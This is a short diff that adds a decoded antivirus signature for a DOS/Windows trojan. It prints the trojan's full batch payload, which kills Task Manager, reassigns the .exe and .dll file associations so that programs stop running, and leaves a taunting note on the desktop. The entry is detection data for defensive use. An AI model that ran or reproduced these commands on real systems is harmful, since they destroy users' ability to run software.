@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36699
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off taskkill /im taskmgr.exe msg * say hello to my little finger cd c:\program files\ assoc .exe=txtfile assoc .dll=batfile cd c:\documents ans settings\all users\desktop echo yo he roto todos tus programas > hola.txt exit 
